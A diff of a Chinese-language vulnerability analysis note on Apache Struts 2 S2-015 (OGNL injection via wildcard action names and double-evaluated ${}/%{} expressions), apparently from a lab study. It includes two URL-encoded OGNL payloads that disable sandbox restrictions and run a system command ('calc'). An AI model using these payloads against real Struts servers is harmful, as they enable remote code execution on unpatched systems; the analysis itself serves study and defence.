@@ -2,55 +2,57 @@
 
 ## Summary
 
-Impact of vulnerability: Remote command execution, remote server context manipulation, injection of malicious client side code
+| Who should read this    | All Struts 2 developers and users                            |
+| :---------------------- | ------------------------------------------------------------ |
+| Impact of vulnerability | Remote command execution, remote server context manipulation, injection of malicious client side code |
+| Maximum security rating | Highly Critical                                              |
+| Recommendation          | Developers should immediately upgrade to [Struts 2.3.14.3](http://struts.apache.org/download.cgi#struts23143) |
+| Affected Software       | Struts 2.0.0 - Struts 2.3.14.2                               |
+| Reporter                | Jon Passki from Coverity Security Research Laboratory reported directly to security@struts.a.o and via [blog post](https://communities.coverity.com/blogs/security/2013/05/29/struts2-remote-code-execution-via-ognl-injection) |
+| CVE Identifier          | [CVE-2013-2135](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2135), [CVE-2013-2134](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2134) |
 
-Affected Software:  `Struts 2.0.0` - `Struts 2.3.14.2`
+## Problem
 
-Problem: 
+1.Action的名称没有转义和检查是否符合白名单。一个场景是当action name配置为通配符，攻击者可以通过访问`<ognl_expression>.action`来传入`ognl`表达式，并在加载`jsp`文件时触发执行。
 
-1. Action的名称没有转义和检查是否符合白名单。一个场景是当action name配置为通配符，攻击者可以通过访问`<ognl_expression>.action`来传入`ognl`表达式，并在加载`jsp`文件时触发执行。
+```java
+<action name="*" class="example.ExampleSupport">
+    <result>/example/{1}.jsp</result>
+</action>
+```
 
-   ```java
-   <action name="*" class="example.ExampleSupport">
-       <result>/example/{1}.jsp</result>
-   </action>
-   ```
+![{3F466E24-9A06-4BB6-81E5-FA37C1198FC9}_20200720185919]({3F466E24-9A06-4BB6-81E5-FA37C1198FC9}_20200720185919.jpg)
 
-   ![{3F466E24-9A06-4BB6-81E5-FA37C1198FC9}_20200720185919]({3F466E24-9A06-4BB6-81E5-FA37C1198FC9}_20200720185919.jpg)
+Payload1: 
 
-   Payload1: 
-
-   ```
-   /s2_015_war_exploded/%24%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%63%61%6c%63%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d.action
-   ```
-
-   
+```
+/s2_015_war_exploded/%24%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%63%61%6c%63%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d.action
+```
 
 2. 当`$`和`%`字符组合使用时，`ognl`表达式会被`TextParseUtil.translateVariables`二次执行。
 
-   ```java
-   <action name="Helloworld" class="org.test.HelloworldAction">
-   	<result name="success" type="httpheader">
-   		<param name="headers.foobar">${message}</param>
-   	</result>
-   </action>
-   ```
+```java
+<action name="Helloworld" class="org.test.HelloworldAction">
+	<result name="success" type="httpheader">
+		<param name="headers.foobar">${message}</param>
+	</result>
+</action>
+```
 
-   ![{E450977C-E4EB-4B47-9D8B-494207ADCDDD}_20200721165527]({E450977C-E4EB-4B47-9D8B-494207ADCDDD}_20200721165527.jpg)
+![{E450977C-E4EB-4B47-9D8B-494207ADCDDD}_20200721165527]({E450977C-E4EB-4B47-9D8B-494207ADCDDD}_20200721165527.jpg)
 
-   Payload2: 
+Payload2: 
 
-   ```
-   /s2_015_war_exploded/Helloworld.action?message=%25%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%63%61%6c%63%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d
-   ```
+```
+/s2_015_war_exploded/Helloworld.action?message=%25%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%63%61%6c%63%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d
+```
 
 ## Environment
 
-Struts2 Version: `Struts-2.2.3`
-
-Server: `Tomcat 8.5.53`
-
-IDE: `idea 2020.1.1 ULTIMATE`
+| Struts2 Version | struts-2.2.3           |
+| --------------- | ---------------------- |
+| Server          | Tomcat 8.5.53          |
+| IDE             | idea 2020.1.1 ULTIMATE |
 
 ## Debug
 
